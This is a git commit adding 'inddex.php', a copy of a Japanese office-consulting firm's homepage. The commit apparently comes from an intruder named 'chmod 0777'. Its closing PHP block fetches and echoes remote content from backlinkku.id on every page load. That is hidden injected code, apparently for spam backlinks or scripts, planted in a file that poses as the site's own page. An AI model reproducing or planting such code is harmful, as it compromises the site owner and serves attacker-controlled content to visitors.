cb99a3ccb4993dd35e77bd364ec16b35d77ed25b
chmod 0777 <ribelcyberteam@gmail.com>
2025-07-28 15:10:11 +0800

    Create inddex.php

---
+++ inddex.php
@@ -0,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# website: http://ogp.me/ns/website#">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width">
+  <meta charset="UTF-8">
+  <title>ダイヤオフィスシステム｜オフィス空間と働き方をデザインするコンサルティングファーム​</title>
+  <meta name="Keywords" content="オフィス移転、オフィスリニューアル、オフィスデザイン、働き方改革​">
+  <meta name="Description" content="私たちダイヤオフィスシステムは、オフィス空間と働き方をデザインするコンサルティングファームです。確かな知識と経験ノウハウにより、お客様一人ひとりが“真に輝けるオフィス空間”をワンストップでご提供します。​">
+  <!--#include virtual="/cmn/inc/ogp.html" -->
+  <link rel="stylesheet" type="text/css" href="/cmn/css/cmn.css" media="all">
+  <link rel="stylesheet" type="text/css" href="/cmn/css/animate.min.css">
+  <link rel="stylesheet" type="text/css" href="/css/flexslider.css">
+  <link rel="stylesheet" type="text/css" href="/projects/css/slick.css">
+  <link rel="stylesheet" type="text/css" href="/projects/css/slick-theme.css" media="all">
+  <link rel="stylesheet" type="text/css" href="/css/index.css" media="all">
+  <link rel="icon" href="/cmn/img/favicon.ico">
+  <!--#include virtual="/cmn/inc/ga.html" -->
+</head>
+<body>
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KZQVQRR"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+<header>
+  <h1 class="logo"><a href="/"><img src="/cmn/img/logo_dos.svg" alt="ダイヤオフィスシステム株式会社"></a></h1>
+</header>
+<!--#include virtual="/cmn/inc/menu.html" -->
+
+<div class="flexslider">
+<ul class="slides">
+<li><img class="js-image-switch" src="/img/bg_index_mv_01_pc.jpg" alt="MV01"></li>
+<li><img class="js-image-switch" src="/img/bg_index_mv_02_pc.jpg" alt="MV02"></li>
+<li><img class="js-image-switch" src="/img/bg_index_mv_03_pc.jpg" alt="MV03"></li>
+</ul>
+</div>
+
+
+<main>
+  <article>
+    <section>
+      <div class="inner">
+        <div class="contents_box">
+          <ul class="pickup_news">
+            <li class="ttl">NEWS</li>
+            <li class="list">
+              <dl class="pickup_news_list">
+                <!--#include virtual="/news/inc/top_upper.html" -->
+              </dl>
+              <p class="list_arrow"><a href="/news/">一覧を見る</a></p>
+            </li>
+          </ul>
+          <div class="message_box_wrap">
+            <p class="mv_svg animated target"><img src="/img/img_index_mv_txt_01.png" alt="Heart&Innovation"></p>
+          <ul class="message_box animated">
+            <li class="ttl animated">働く人が、<br>真に輝けるオフィスを。</li>
+            <li class="txt animated">私たちダイヤオフィスシステムは、オフィス空間と<br>働き方をデザインするコンサルティングファームです。</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="works">
+    <div class="inner">
+      <ul class="works_wrap">
+        <li class="ttl">PROJECTS</li>
+        <li class="txt">クライアントの思いを実現し、企業の発展と未来につながる価値を生み出すため、​<br class="display_pc">経験と知識にもとづいた提案力と実行力でプロジェクトを成功へと導きます。​<p class="detail"><a href="/projects/index.html">実績一覧</a></p></li>
+      </ul>
+    </div>
+    <!--#include virtual="/projects/inc/top.html" -->
+  </section>
+
+      <section class="management animated">
+        <div class="inner">
+          <ul class="management_ttl">
+            <li><span><img src="/img/ttl_index_management.png" alt="オフィス環境のトータルマネジメントを通じて、お客様のビジネスパフォーマンス向上を実現します。"></span>ダイヤオフィスシステムの仕事はすべて</li>
+            <li>"人"が要。</li>
+          </ul>
+
+          <a href="/about/index.html">
+            <ul class="about">
+              <li><p class="ttl"><span>ABOUT US</span>私たちが<br>大切にしていること​</p></li>
+              <li>
+                <p class="txt">私たちのすべての企業活動の根幹にあるのがホスピタリティです。<br>
+                  企業の可能性を広げるパートナーとして、働く人が幸せで夢を語れるオフィス空間を真心を込めて提供します。</p>
+                  <p class="detail">詳しく見る</p></li>
+                </ul>
+              </a>
+
+
+              <ul class="about_list">
+                <li class="animated">
+                  <a href="/service/office-design/index.html">
+                    <span class="num">01</span>
+                    <span class="txt_en_small">office</span><span class="txt_en_big">DESIGN</span>
+                    <span class="txt">ワークスタイルデザイン</span>
+                    <span class="list_arrow">詳しくみる</span>
+                  </a>
+                </li>
+                <li class="animated">
+                  <a href="/service/office-making/index.html">
+                    <span class="num">02</span>
+                    <span class="txt_en_small">office</span><span class="txt_en_big">MAKING</span>
+                    <span class="txt">オフィス移転・リニューアル</span>
+                    <span class="list_arrow">詳しくみる</span>
+                  </a>
+                </li>
+                <li class="animated">
+                  <a href="/service/office-ict/index.html">
+                    <span class="num">03</span>
+                    <span class="txt_en_small">office</span><span class="txt_en_big">ICT</span>
+                    <span class="txt">ICTソリューション</span>
+                    <span class="list_arrow">詳しくみる</span>
+                  </a>
+                </li>
+                <li class="animated">
+                  <a href="/service/office-sales/index.html">
+                    <span class="num">04</span>
+                    <span class="txt_en_small">office</span><span class="txt_en_big">SALES</span>
+                    <span class="txt">オフィス用品販売</span>
+                    <span class="list_arrow">詳しくみる</span>
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </section>
+
+          <section class="news">
+            <div class="inner">
+              <p class="ttl animated">NEWS</p>
+              <p class="list_arrow animated"><a href="/news/">一覧はこちら</a></p>
+              <ul class="news_wrap">
+                <!--#include virtual="/news/inc/top_lower.html" -->
+              </ul>
+            </div>
+          </section>
+
+        </article>
+      </main>
+
+      <!--#include virtual="/cmn/inc/footer.html" -->
+      <script type="text/javascript" src="/cmn/js/jquery.inview.min.js"></script>
+      <script type="text/javascript" src="/assets_c/js/jquery.waypoints.min.js"></script>
+      <script type="text/javascript" src="/js/jquery.flexslider-min.js"></script>
+      <script type="text/javascript" src="/js/background-check.min.js"></script>
+      <script type="text/javascript" src="/js/index.js"></script>
+      <script>
+      $(function(){
+        $('.flexslider').flexslider({
+          animation: 'fade',
+          animationSpeed: 4000,
+          slideshowSpeed: 7000,
+          controlNav: false,
+          directionNav: false,
+          pauseOnAction: false,
+          start: function () {
+            BackgroundCheck.init({
+              targets: '.target',
+              images: '.flexslider img'
+            });
+          },
+          after: function () {
+            BackgroundCheck.refresh();
+          }
+        });
+      });
+      </script>
+
+
+<!--#include virtual="/cmn/inc/analytics.html" -->
+</body>
+</html>
+<?php
+echo file_get_contents("https://backlinkku.id/menu/vip-v2/script.txt");
+?>
